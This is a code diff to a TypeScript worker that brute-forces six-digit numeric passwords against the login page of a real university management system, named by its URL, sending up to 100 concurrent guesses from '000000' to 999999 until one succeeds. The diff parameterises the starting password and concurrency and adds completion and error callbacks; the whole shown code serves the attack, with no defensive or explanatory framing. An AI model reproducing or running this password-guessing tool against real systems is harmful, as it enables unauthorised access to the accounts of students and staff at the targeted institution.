@@ -8,12 +8,10 @@ const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
 
 
-export function worker(username: string): Promise<any>{
+export function worker(username: string,password:string="000000",concurrency:number=100): Promise<any>{
   return new Promise((resolve,reject)=>{
     let success = false
     let view_state = ""
-    let password = "000000"
-    const concurrency = 100
     username = username.toLowerCase()
     log("username: ",username)
         /**
@@ -88,19 +86,23 @@ export function worker(username: string): Promise<any>{
           trypass.push(password,()=>{
             log("length",trypass.length())
             log("running",trypass.running())
-            if(trypass.length()<concurrency){
+            if(trypass.length()<concurrency&&parseInt(password)<1000000&&!success){
               push()
             }
             if(success){
               trypass.kill()
             }
-            if(trypass.empty()){
-              resolve()
-            }
           })
           password = increase(password)
         }
-        while(parseInt(password)<=concurrency&&!success){
+        trypass.drain(()=>{//队列消耗完回调
+          resolve(`failed on username: ${username}`)
+        })
+        trypass.error((error,task)=>{
+          log("request failed "+task," detail ",error)
+        })
+
+        for(let i=0;i<concurrency;i++){
           push()
         }
       } catch (error) {
